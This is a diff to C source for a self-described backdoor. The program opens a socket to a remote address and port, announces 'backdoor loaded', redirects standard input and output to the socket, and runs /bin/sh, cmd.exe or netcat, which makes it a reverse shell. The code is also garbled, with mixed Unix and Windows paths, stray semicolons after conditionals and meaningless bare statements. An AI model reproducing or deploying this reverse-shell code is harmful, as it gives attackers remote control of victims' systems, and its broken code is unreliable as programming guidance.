@@ -30,7 +30,7 @@ terraquian date: 4/10/2017 - 04:57 AM - *** in desenvolpment.
 #include <time.h>
 #include <sys/types.h>
 #include <sys/socket.h>
-//#include <X11/Xlib.h>
+#include <X11/Xlib.h>
 
 #define remote_addr "127.0.0.1"
 #define remote_port 2222
@@ -133,7 +133,7 @@ terraquian date: 4/10/2017 - 04:57 AM - *** in desenvolpment.
 
     {
 
-    //XFreeCursor; //magic happens here
+    XFreeCursor; //magic happens here
 
     pid_t pid;
 
@@ -181,13 +181,14 @@ terraquian date: 4/10/2017 - 04:57 AM - *** in desenvolpment.
 
 
     return;
-}
+
+  }
+  
   void
   shell()
 
   {
     int  x;
-  //  FILE *filecmd;
     struct sockaddr_in s;
     int root;
     char command[bytes];
@@ -221,7 +222,6 @@ terraquian date: 4/10/2017 - 04:57 AM - *** in desenvolpment.
             exit(EXIT_SUCCESS);
 
         sigmask(0);
-       // sigsetmask(23212);
         chdir("/, C:\\, C:\\Windows\\System32");
 
         int k;
@@ -259,10 +259,10 @@ terraquian date: 4/10/2017 - 04:57 AM - *** in desenvolpment.
 //     backdoor_connect();
      send(x,"\n...\n **\n ** backdoor loaded...",33,0), send(x,"\n Connected in machine \n\n",25,0);
 
-     /*handle with the impossible errors.
+     //handle with the impossible errors.
 
-     if(recv(x,command,bytes,0)  0);
-     perror("Connection failed:"); */
+     if(recv(x,command,bytes,0)  < 0);
+     perror("Connection failed:"); //
 
      if(connect == 0x0)
      perror("BREAK CONNECTION,(failure)");
@@ -271,7 +271,7 @@ terraquian date: 4/10/2017 - 04:57 AM - *** in desenvolpment.
 
      if(recv(x,command,bytes,NULL) > 0);
 
-     //XFreeCursor;
+     XFreeCursor;
      dup2(x, 0),dup2(x, 1),dup2(x, 2);
      root = execve("/bin/sh", cmd,  window),execve("C:\\windows\\System32\\cmd.exe ", cmd, window),execve("netcat", cmd, window);
 
